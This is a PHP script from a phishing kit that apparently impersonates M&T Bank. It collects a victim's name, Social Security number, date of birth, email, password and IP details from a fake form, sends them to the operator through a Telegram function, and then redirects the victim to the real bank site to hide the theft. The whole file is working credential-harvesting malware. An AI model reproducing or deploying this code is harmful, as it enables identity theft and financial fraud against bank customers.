<?php
require('config.php');
if($_POST["name1"] != "" and $_POST["name2"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------DWA M&t Info-----------------------\n";

$message .= "First name            : ".$_POST['name1']."\n";
$message .= "Last Name            : ".$_POST['name2']."\n";
$message .= "ssn              : ".$_POST['name3']."\n";
$message .= "Dob              : ".$_POST['name4']."\n";
$message .= "vbp             : ".$_POST['name5']."\n";
$message .= "Email            : ".$_POST['name6']."\n";
$message .= "Password             : ".$_POST['name7']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
$message = "DWA M&t Info | $ip \n".$message;
{
send_telegram_msg($message);  
}
$praga=rand();
$praga=md5($praga);
  header ("Location: https://www.mtb.com/");
}else{
header ("Location: https://www.mtb.com/");
}

?>